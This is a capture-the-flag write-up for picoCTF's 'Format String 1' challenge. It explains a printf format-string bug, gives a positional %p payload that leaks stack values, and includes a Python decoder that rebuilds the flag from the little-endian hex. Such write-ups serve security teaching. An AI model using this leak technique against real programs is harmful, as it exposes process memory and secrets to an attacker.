# Format String 1

**Platform:** picoCTF  
**Technique:** Format String Leak  
**Difficulty:** Easy  

## Challenge Description

A format string vulnerability where we need to leak values from the stack to reconstruct the flag. The program takes input and prints it back using `printf` directly.

## Vulnerability

The program uses `printf` on user input without a format specifier, allowing us to read stack values using `%p`, `%x`, `%s`, etc.

## Exploitation

### Step 1: Finding the Right Offsets

I needed to find which stack positions contained pieces of the flag. By sending multiple `%p` specifiers, I could leak values from different stack positions:

```python
payload = "%10$p.%11$p.%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p.%19$p.%20$p"
```
The $ syntax allows direct parameter access:

%10$p – prints the 10th argument as a pointer

%11$p – prints the 11th argument, etc.

Step 2: Receiving the Leaks
After sending the payload, the program returns a line with the leaked pointers separated by dots:

text
0x7025....0x7025... (actual leak data)
Step 3: Decoding the Flag
The leaked data contains the flag scattered across multiple stack positions in hex format. The decoder:

```python
def decode_leak(data):
    parts = data.split('.')
    flag = ""
    for part in parts:
        if "0x" in part and part != "(nil)":
            try:
                clean_hex = part.replace("0x", "")
                if len(clean_hex) % 2 != 0:
                    clean_hex = "0" + clean_hex
                decoded_bytes = bytes.fromhex(clean_hex)[::-1]
                flag += decoded_bytes.decode(errors="ignore")
            except Exception:
                continue
    return flag
```
What it does:

Splits the leaked data by dots

For each hex value:

Removes 0x prefix

Ensures even length (pad with 0 if needed)

Converts hex to bytes

Reverses for little-endian (x86/x64 stores least significant byte first)

Decodes to string, ignoring errors

Concatenates all decoded pieces

Step 4: Getting the Flag
The decoded string from positions 10-20 contained the complete flag.
